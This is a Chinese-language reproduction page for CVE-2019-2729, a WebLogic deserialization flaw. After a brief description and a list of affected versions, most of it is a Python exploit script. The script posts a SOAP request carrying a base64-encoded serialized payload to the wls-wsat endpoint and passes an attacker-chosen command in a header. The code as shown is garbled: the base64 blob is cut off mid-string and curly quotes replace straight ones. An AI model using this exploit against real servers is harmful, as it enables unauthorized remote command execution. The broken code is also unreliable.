# （CVE-2019-2729）Weblogic反序列化漏洞

> 原文：[https://www.zhihuifly.com/t/topic/3692](https://www.zhihuifly.com/t/topic/3692)

# （CVE-2019-2729）Weblogic反序列化漏洞

## 一、漏洞简介

与CVE-2019-2725漏洞相似，**CVE-2019-2729漏洞是由于应用在处理反序列化输入信息时存在缺陷，攻击者可以通过发送精心构造的恶意 HTTP 请求，用于获得目标服务器的权限，并在未授权的情况下执行远程命令，最终获取服务器的权限。**针对此漏洞，官方已经发布补丁，所以强烈建议受到影响的用户尽快下载官方最新补丁，以防服务器处于高风险之中。

## 二、漏洞影响

Oracle WebLogic 10.3.6

Oracle WebLogic 12.1.3

Oracle WebLogic 12.2.1.3

## 三、复现过程

### poc

> usage: oracle-weblogic-deserialize.py [-h] -u TARGET -c COMMAND
> 
> -h, --help : Show help message and exit
> -u TARGET : Target URL
> -c COMMAND : Command to execute

#### Example Usage

python oracle-weblogic-deserialize.py -u http://www.0-sec.org:8080 -c whoami

```
import argparse
import requests
import sys
import os
import base64
import urllib3

parser = argparse.ArgumentParser()

parser.add_argument(’-u’, dest=‘target’, default=’’, required=True, help=“Target URL”)

parser.add_argument(’-c’, dest=‘command’, default=’’, required=True, help=“Command”)

args = parser.parse_args()

target = str(args.target)

command = str(args.command)

headers = {

‘Content-Type’:‘text/xml’,

‘User-Agent’:‘Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0’,

‘SOAPAction’:’’,

‘lfcmd’:command

}

url = target + “/wls-wsat/CoordinatorPortType”

pref = ‘<?xml version=“1.0” encoding=“utf-8”?><soapenv:Envelope xmlns:soapenv=“[http://schemas.xmlsoap.org/soap/envelope/](http://schemas.xmlsoap.org/soap/envelope/)” xmlns:wsa=“[http://www.w3.org/2005/08/addressing](http://www.w3.org/2005/08/addressing)” xmlns:asy=“[http://www.bea.com/async/AsyncResponseService](http://www.bea.com/async/AsyncResponseService)”> <soapenv:Header> <work:WorkContext xmlns:work=“[http://bea.com/2004/06/soap/workarea/](http://bea.com/2004/06/soap/workarea/)”> <java> <array method=“forName”> <string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string> <void>’

yss_obj = “CjxhcnJheSBjbGFzcz0iYnl0ZSIgbGVuZ3RoPSI2ODYyIj48dm9pZCBpbmRleD0iMTYwMSI+PGJ5dGU+MTAwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTM4MSI+PGJ5dGU+NjQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyODkzIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEyMzUiPjxieXRlPjk5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTE1Ij48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMDkyIj48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNjE5Ij48Ynl0ZT42NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIwOTEiPjxieXRlPjcyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjM1NCI+PGJ5dGU+MTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMTY0Ij48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNTc4Ij48Ynl0ZT4xMDQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI4OTciPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE2MjUiPjxieXRlPjEyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjY0MSI+PGJ5dGU+NzI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjYyIj48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM3MCI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjIxNiI+PGJ5dGU+NzQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MTQ3Ij48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMjU1Ij48Ynl0ZT4xMDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMDQiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0ODQiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDEwOCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNjQyIj48Ynl0ZT4xMTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MzE4Ij48Ynl0ZT4xMDU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NjUyIj48Ynl0ZT4yMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYzMjQiPjxieXRlPjI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0OTY1Ij48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MTcxIj48Ynl0ZT40OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2NTIiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTc4MyI+PGJ5dGU+MTA5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjc2NiI+PGJ5dGU+MTAwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTU5NCI+PGJ5dGU+MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijk0MiI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDc4NiI+PGJ5dGU+NzY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMzU5Ij48Ynl0ZT4xMTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MzQxIj48Ynl0ZT4xMDU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MjkiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE3NTkiPjxieXRlPjExODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMxNDgiPjxieXRlPjEwNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUyNjkiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU0MzIiPjxieXRlPjExNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIxMzkiPjxieXRlPjEwNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2Ij48Ynl0ZT4tMzU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTQ4Ij48Ynl0ZT44MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ3ODgiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTU0MSI+PGJ5dGU+NTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1ODgxIj48Ynl0ZT40PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTk0NyI+PGJ5dGU+LTc0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTIzNSI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMTQ0Ij48Ynl0ZT43MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMzNjEiPjxieXRlPjEwNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI5NDciPjxieXRlPjg3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjQwOCI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjE4MyI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTMyMCI+PGJ5dGU+NTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxODEzIj48Ynl0ZT4xMDM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyODA4Ij48Ynl0ZT4xMTI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMDMiPjxieXRlPjgzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDI4NiI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTY4OSI+PGJ5dGU+NDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTgwIj48Ynl0ZT42OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMxMjEiPjxieXRlPjQ4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzEwMCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MTQyIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUzNyI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNDE3Ij48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NDk4Ij48Ynl0ZT41OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE5MzciPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjk4NSI+PGJ5dGU+MTA0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTUwMCI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTQ0NyI+PGJ5dGU+NTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMzA0Ij48Ynl0ZT43MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUwOTciPjxieXRlPjczPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNzcwIj48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMjQ0Ij48Ynl0ZT41NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ3MTYiPjxieXRlPjEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzQ1MCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMTUiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjYzMSI+PGJ5dGU+NzM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NDMwIj48Ynl0ZT4xMTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzI1Ij48Ynl0ZT44NDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE4ODkiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjMzMSI+PGJ5dGU+NTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMDExIj48Ynl0ZT4xMDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzg3Ij48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2ODM4Ij48Ynl0ZT40NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY2OTQiPjxieXRlPjQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjYwIj48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1ODExIj48Ynl0ZT41NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM0MzMiPjxieXRlPjExMjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI1MDYiPjxieXRlPjEwMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI0MiI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDA2MCI+PGJ5dGU+ODU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTc5Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMzMzYiPjxieXRlPjUzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTgwNiI+PGJ5dGU+NTM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NjM2Ij48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQzMzEiPjxieXRlPjY4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTE3OSI+PGJ5dGU+MTI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MDE0Ij48Ynl0ZT4yMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM1MzUiPjxieXRlPjcxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTU2OCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNjQ3Ij48Ynl0ZT43MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE3OTYiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzg2MCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1OTA4Ij48Ynl0ZT4xMDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MDc0Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIyMDQiPjxieXRlPjkwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDcyNSI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0Nzc3Ij48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNTEzIj48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI4MzYiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2MTMiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEwOTYiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjkzNCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI4MDEiPjxieXRlPjEwODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEwMzgiPjxieXRlPjQ3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTAwMiI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MDUwIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ4NzMiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI1MyI+PGJ5dGU+OTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNjM2Ij48Ynl0ZT42NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUzMTciPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQzNjAiPjxieXRlPjc2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzI0Ij48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMDI0Ij48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMDciPjxieXRlPjExMjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI0MzgiPjxieXRlPjg2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTgzMCI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MTc3Ij48Ynl0ZT41MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMwMSI+PGJ5dGU+MTIxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzA3NCI+PGJ5dGU+OTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MjQyIj48Ynl0ZT44MDwvYnl0ZT48L3ZvaWQ+PHZva”

xml = base64.b64decode(yss_obj)

payload = pref + xml.decode()

requests.packages.urllib3.disable_warnings()

requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ‘HIGH:!DH:!aNULL’

try:

requests.packages.urllib3.contrib.pyopenssl.DEFAULT_SSL_CIPHER_LIST += ‘HIGH:!DH:!aNULL’

except AttributeError:

pass

print("[+] Send Request to : " + url)

print("\n")

res = requests.post(url, headers=headers, data=payload, timeout=10, verify=False) `print("[+] Response : " + res.text)` 
```

## 参考链接

> [https://github.com/ruthlezs/CVE-2019-2729-Exploit/blob/master/oracle-weblogic-deserialize.py](https://github.com/ruthlezs/CVE-2019-2729-Exploit/blob/master/oracle-weblogic-deserialize.py)